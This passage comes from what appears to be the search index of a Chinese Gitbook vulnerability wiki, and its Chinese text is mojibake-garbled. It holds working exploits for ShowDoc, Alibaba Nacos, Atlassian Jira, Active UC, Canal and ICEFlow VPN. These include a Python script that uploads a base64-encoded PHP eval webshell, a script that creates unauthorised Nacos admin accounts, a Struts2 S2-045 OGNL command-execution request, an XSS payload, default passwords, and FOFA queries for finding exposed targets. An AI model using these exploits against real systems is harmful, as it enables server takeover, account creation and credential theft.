yzmphp_adminname=1fc8yAdCyAogZ-PIz4c66dU1ij0mHsG7KGF_5tToVThEzbc Connection: close sec=requestpass&email=peiqi%40peiqi.com%22%3E%3Cimg+src%3Da+onerror%3Dalert%28%22peiqi%22%29%3Egcuak&code=12345&login= Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ShowDoc/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ShowDoc/","title":"ShowDoc","keywords":"","body":"ShowDoc ShowDoc ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ShowDoc/ShowDoc ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ShowDoc/ShowDoc ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html","title":"ShowDoc ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û","keywords":"","body":"ShowDoc ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ShowDoc Â≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÁâπÊÆäÁöÑÊï∞ÊçÆÂåÖÂèØ‰ª•‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ShowDoc FOFA [!NOTE] app=\"ShowDoc\" ÊºèÊ¥ûÂ§çÁé∞ ÁΩëÁ´ôÈ¶ñÈ°µÂ¶Ç‰∏ã ÊûÑÈÄ†Â¶Ç‰∏ãÊï∞ÊçÆÂåÖ‰∏ä‰º†phpÊñá‰ª∂ POST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Content-Length: 239 Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617 Accept-Encoding: gzip ----------------------------921378126371623762173617 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\" Content-Type: text/plain ----------------------------921378126371623762173617-- ËÆøÈóÆÂõûÊòæÁöÑË∑ØÂæÑ ÊºèÊ¥ûPOC import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mTitle: ShowDoc ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/index.php?s=/home/page/uploadImg\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\", \"Content-Type\": \"multipart/form-data; boundary=--------------------------921378126371623762173617\" } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"success\" in response.text and response.status_code == 200: webshell_url = re.findall(r'\"url\":\"(.*?)\"', response.text)[0] webshell_url = webshell_url.replace('\\\\','') response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5) if \"test_test\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊàêÂäü‰∏ä‰º†Êú®È©¨ \\n[o] Ë∑ØÂæÑ‰∏∫ {}\\033[0m\".format(target_url, webshell_url)) print(\"\\033[32m[o] ÂØÜÁ†Å‰∏∫: peiqi \\033[0m\") else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) else: print(\"\\033[31m[x] ‰∏ä‰º†Â§±Ë¥• \\033[0m\") except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Nacos/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Nacos/","title":"Alibaba Nacos","keywords":"","body":"Alibaba Nacos Alibaba Nacos ÊéßÂà∂Âè∞ÈªòËÆ§Âº±Âè£‰ª§ Alibaba Nacos Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Nacos/Alibaba Nacos ÊéßÂà∂Âè∞ÈªòËÆ§Âº±Âè£‰ª§.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Nacos/Alibaba Nacos ÊéßÂà∂Âè∞ÈªòËÆ§Âº±Âè£‰ª§.html","title":"Alibaba Nacos ÊéßÂà∂Âè∞ÈªòËÆ§Âº±Âè£‰ª§","keywords":"","body":"Alibaba Nacos ÊéßÂà∂Âè∞ÈªòËÆ§Âº±Âè£‰ª§ ÊºèÊ¥ûÊèèËø∞ Alibaba Nacos ÊéßÂà∂Âè∞Â≠òÂú®ÈªòËÆ§Âº±Âè£‰ª§ nacos/nacosÔºåÂèØÁôªÂΩïÂêéÂè∞Êü•ÁúãÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Alibaba Nacos ÊºèÊ¥ûÂ§çÁé∞ ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±Ç ËøîÂõû200ËØ¥ÊòéÊàêÂäüÁôªÂΩï Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Alibaba_Nacos_Default_password.json Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Nacos/Alibaba Nacos Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Nacos/Alibaba Nacos Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û.html","title":"Alibaba Nacos Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û","keywords":"","body":"Alibaba Nacos Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ 2020Âπ¥12Êúà29Êó•ÔºåNacosÂÆòÊñπÂú®githubÂèëÂ∏ÉÁöÑissue‰∏≠Êä´Èú≤Alibaba Nacos Â≠òÂú®‰∏Ä‰∏™Áî±‰∫é‰∏çÂΩìÂ§ÑÁêÜUser-AgentÂØºËá¥ÁöÑÊú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û „ÄÇÈÄöËøáËØ•ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•ËøõË°å‰ªªÊÑèÊìç‰ΩúÔºåÂåÖÊã¨ÂàõÂª∫Êñ∞Áî®Êà∑Âπ∂ËøõË°åÁôªÂΩïÂêéÊìç‰Ωú„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Nacos FOFA [!NOTE] title=\"Nacos\" ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 wget https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz ./startup.sh -m standalone ÁÑ∂ÂêéËÆøÈóÆ http://xxx.xxx.xxx.xxx:8848/nacos Âç≥ÂèØÔºåÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å nacos/nacos ÊºèÊ¥ûÂ§çÁé∞ ÂèØ‰ª•ÂÜçÈ°πÁõÆÁöÑ issues ‰∏≠ÁúãÂà∞Â§ßÈáèÁöÑÂÖ≥‰∫éË∂äÊùÉÁöÑÂÆâÂÖ®ÈóÆÈ¢òÁöÑËÆ®ËÆ∫ https://github.com/alibaba/nacos/issues/1105 ËøôÈáåÊàë‰ª¨Âú®ÁôªÂΩïÂêé‰ªªÊÑè‰∏Ä‰∏™‰ΩçÁΩÆÁúã‰∏Ä‰∏ãËØ∑Ê±ÇÔºåÂπ∂Âú®Êú™ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ãÁúãÊòØÂê¶ÂèØ‰ª•ËÆøÈóÆ ËøôÈáåÁöÑËØ∑Ê±ÇurlÁÆÄÂåñ‰∏∫ http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword= ÈÄÄÂá∫Áî®Êà∑ÂêéÂú®ÂâçÂè∞ËÆøÈóÆËøô‰∏™ url ÂèØ‰ª•ÂèëÁé∞‰ª•ÂèäÊ≥ÑÈú≤‰∫Ü ipËäÇÁÇπ Á≠âÊï∞ÊçÆ ÂêåÊ†∑Êàë‰ª¨Êü•ÁúãÁî®Êà∑ÂàóË°®ÁöÑËØ∑Ê±ÇÂπ∂Âú®ÂâçÂè∞ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 ËøôÈáåÂèØ‰ª•ÂèëÁé∞ÂØπÁî®Êà∑ÁöÑËØ∑Ê±ÇÊòØÂÆåÂÖ®Ê≤°ÊúâËøáÊª§ÁöÑÔºåÂèØ‰ª•ÈÄöËøáÊú™ÊéàÊùÉÁöÑÊÉÖÂÜµËé∑ÂèñÁî®Êà∑ÁöÑÊïèÊÑü‰ø°ÊÅØ Êàë‰ª¨Â∞ùËØïÂàõÂª∫Áî®Êà∑Âπ∂ÊäìÂåÖ ËøîÂõû‰∏ãÂàóÂàõÂª∫ÊàêÂäü {\"code\":200,\"message\":\"create user ok!\",\"data\":null} ÂêåÊ†∑ÁöÑÊàë‰ª¨ÁÆÄÂåñËØ∑Ê±Ç POST /nacos/v1/auth/users? username=peiqi&password=peiqi ÁúãÂà∞ÊúâÊñáÁ´†ËØ¥Ë¶ÅÂä†‰∏äUser-AgentËØ∑Ê±ÇÂ§¥ User-Agent: Nacos-Server ‰ΩÜÊòØÂ§ßÈáèÊµãËØï‰πãÂêéÂèëÁé∞Â•ΩÂÉèÊòØÊó†ÂÖ≥Á¥ßË¶ÅÁöÑÔºåÊ≤°ÊúâËØ∑Ê±ÇÂ§¥ÂêåÊ†∑ÂèØ‰ª•ÂàõÂª∫Áî®Êà∑ [!NOTE] ÂêåÊ†∑ÁöÑÂéüÁêÜ‰πüÂèØ‰ª•Áî®‰∫é‰øÆÊîπÂØÜÁ†ÅÊ∑ªÂä†ÈÖçÁΩÆÁ≠â ÊºèÊ¥ûÂà©Áî®POC [!NOTE] Ê≥®ÊÑè‰∏ãÂ§ßÈÉ®ÂàÜ‰ºÅ‰∏öÁöÑ nacosÁöÑurl‰∏∫ /v1/auth/users ÔºåËÄå‰∏çÊòØ /nacos/v1/auth/users ÂèØ‰ª•ÊåâÁõÆÊ†áÊÉÖÂÜµËá™Ë°å‰øÆÊîπ import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Nacos >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): # vuln_url = target_url + \"/nacos/v1/auth/users\" vuln_url = target_url + \"/v1/auth/users\" headers = { \"User-Agent\": \"Nacos-Server\", \"Content-Type\": \"application/x-www-form-urlencoded\", } number = random.randint(0,999) data = \"username=peiqi{}&password=peiqi\".format(str(number)) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/nacos/v1/auth/users \\033[0m\".format(target_url)) if \"create user ok!\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÊàêÂäüÂàõÂª∫Ë¥¶Êà∑ peiqi{} peiqi\\033[0m\".format(str(number))) else: print(\"\\033[31m[x] ÂàõÂª∫Áî®Êà∑ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Alibaba_Nacos_Add_user_not_authorized.json Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Atlassian Jira/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Atlassian Jira/","title":"Atlassian Jira","keywords":"","body":"Atlassian Jira Atlassian Jira ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-14181 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Atlassian Jira/Atlassian Jira ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-14181.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Atlassian Jira/Atlassian Jira ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-14181.html","title":"Atlassian Jira ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-14181","keywords":"","body":"Atlassian Jira ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-14181 ÊºèÊ¥ûÊèèËø∞ JiraÂ≠òÂú®‰∏Ä‰∏™Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥ûÔºåÊú™ÊéàÊùÉÁöÑÁî®Êà∑ÂèØ‰ª•ÈÄöËøá‰∏Ä‰∏™apiÊé•Âè£Áõ¥Êé•Êü•ËØ¢Âà∞ÊüêÁî®Êà∑ÂêçÁöÑÂ≠òÂú®ÊÉÖÂÜµÔºåËØ•Êé•Âè£‰∏çÂêå‰∫éCVE-2019-8446ÂíåCVE-2019-3403ÁöÑÊé•Âè£ÔºåÊòØ‰∏Ä‰∏™Êñ∞ÁöÑÊé•Âè£„ÄÇÂ¶ÇÊûúJiraÊö¥Èú≤Âú®ÂÖ¨ÁΩë‰∏≠ÔºåÊú™ÊéàÊùÉÁî®Êà∑Â∞±ÂèØ‰ª•Áõ¥Êé•ËÆøÈóÆËØ•Êé•Âè£ÁàÜÁ†¥Âá∫ÊΩúÂú®ÁöÑÁî®Êà∑Âêç„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Atlassian Jira Atlassian Jira 8.0.0 - 8.5.7 Atlassian Jira 8.6.0 - 8.12.0 FOFA [!NOTE] app=\"Jira\" ÊºèÊ¥ûÂ§çÁé∞ ÊâìÂºÄ‰∏ªÁïåÈù¢ÔºåÊ≥®ÊÑèÊ†áËØÜ‰∏≠ÁöÑ JiraÁâàÊú¨ÊòØÂê¶Âú®ÂΩ±Âìç‰∏≠ ‰ΩøÁî®POCÂØπÁî®Êà∑ÂêçÊòØÂê¶Â≠òÂú®ËøõË°åÈ™åËØÅ http://xxx.xxx.xxx.xxx/secure/ViewUserHover.jspa?username=admin Áî®Êà∑ÂêçÂ¶ÇÊûú‰∏çÂ≠òÂú®‰ºöËøîÂõû Â≠òÂú®ÁöÑÁî®Êà∑Âêç‰ºöËøîÂõû ‰∏çÂ≠òÂú®ÊºèÊ¥û‰ºöËøîÂõû ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POCÂè™Áî®‰∫éÊé¢ÊµãÊòØÂê¶Â≠òÂú®ÊºèÊ¥û ÁàÜÁ†¥ÂèØ‰ΩøÁî®: https://github.com/Rival420/CVE-2020-14181/blob/main/cve-2020-1481.py import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Atlassian Jira >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/secure/ViewUserHover.jspa?username=peiqipeiqipeiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) version = re.findall(r'\\((.*?)#', response.text)[0] print(\"\\033[32m[o] ÁõÆÊ†á Jira ÁâàÊú¨‰∏∫{} \\033[0m\".format(version)) if \"peiqipeiqipeiqi\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á{}Â≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Atlassian_Jira_user_information_disclosure Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Canal/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Canal/","title":"Alibaba Canal","keywords":"","body":"Alibaba Canal Alibaba Canal config ‰∫ëÂØÜÈí•‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Canal/Alibaba Canal config ‰∫ëÂØÜÈí•‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Alibaba Canal/Alibaba Canal config ‰∫ëÂØÜÈí•‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"Alibaba Canal config ‰∫ëÂØÜÈí•‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"Alibaba Canal config ‰∫ëÂØÜÈí•‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Áî±‰∫é/api/v1/canal/config Êú™ËøõË°åÊùÉÈôêÈ™åËØÅÂèØÁõ¥Êé•ËÆøÈóÆÔºåÂØºËá¥Ë¥¶Êà∑ÂØÜÁ†Å„ÄÅaccessKey„ÄÅsecretKeyÁ≠â‰∏ÄÁ≥ªÂàóÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Alibaba Canal FOFA [!NOTE] title=\"Canal Admin\" ÊºèÊ¥ûÂ§çÁé∞ È™åËØÅÊºèÊ¥ûÁöÑUrl‰∏∫ /api/v1/canal/config/1/0 ÂÖ∂‰∏≠Ê≥ÑÈú≤‰∫Ü aliyun.access ÂØÜÈí•ÔºåÂèØ‰ª•ÊéßÂà∂ÂØÜÈí•‰∏ãÁöÑÊâÄÊúâÊúçÂä°Âô® ‰∫ëÂØÜÈí•Ê≥ÑÈú≤ÂèÇËÄÉ: red.peiqi.tech ÂÖ∂‰∏≠ËøòÂê´ÊúâÈªòËÆ§Âè£‰ª§ admin/123456 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Active UC/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Active UC/","title":"Active UC","keywords":"","body":"Active UC Active UC index.action ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Active UC/Active UC index.action ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Active UC/Active UC index.action ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Active UC index.action ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Active UC index.action ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÁΩëÂä®Áªü‰∏ÄÈÄö‰ø°Âπ≥Âè∞ Active UC index.action Â≠òÂú®S2-045ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û, ÈÄöËøáÊºèÊ¥ûÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Active UC FOFA [!NOTE] title=\"ÁΩëÂä®Áªü‰∏ÄÈÄö‰ø°Âπ≥Âè∞(Active UC)\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÂåÖ POST /acenter/index.action HTTP/1.1 Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Charsert: UTF-8 Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170 Cache-Control: no-cache Pragma: no-cache Host: Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 196 -----------------------------18012721719170 Content-Disposition: form-data; name=\"pocfile\"; filename=\"text.txt\" Content-Type: text/plain xxxxxxx -----------------------------18012721719170 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ICEFlow/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ICEFlow/","title":"ICEFlow","keywords":"","body":"ICEFlow ICEFlow VPN ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ICEFlow/ICEFlow VPN ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ICEFlow/ICEFlow VPN ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"ICEFlow VPN ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"ICEFlow VPN ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ICEFlow VPN Â≠òÂú®‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•Êü•ÁúãÊó•Âøó‰∏≠ÁöÑÊïèÊÑüÊï∞ÊçÆÊù•Ëøõ‰∏ÄÊ≠•ÊîªÂáªÁ≥ªÁªü ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ICEFlow VPN FOFA [!NOTE] title=\"ICEFLOW VPN Router\" ÊºèÊ¥ûÂ§çÁé∞ ÂèØËÆøÈóÆÁöÑÊó•Âøó Url Á≥ªÁªüÊó•Âøó http://url/log/system.log VPNÊó•Âøó http://url/log/vpn.log ËÆøÈóÆÊó•Âøó http://url/log/access.log ÂëäË≠¶Êó•Âøó http://url/log/warn.log ÈîôËØØÊó•Âøó http://url/log/error.log Ë∞ÉËØïÊó•Âøó http://url/log1/debug.log ÁßªÂä®Áî®Êà∑Êó•Âøó http://url/log/mobile.log Èò≤ÁÅ´Â¢ôÊó•Âøó http://url/log/firewall.log Ê†πÊçÆÊó•Âøó‰ø°ÊÅØËé∑ÂæósessionÂêéÔºåÂèØÂà©Áî®ÂÆûÊó∂ÁôªÂΩïÁ≥ªÁªüÁÆ°ÁêÜÂêéÂè∞Ôºö http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10&session_id=xxxxxxxxxxxxxx&l=0 Goby & POC [!NOTE] ICEFlow VPN ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÂèÇËÄÉÊñáÁ´† https://www.uedbox.com/post/18720/ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 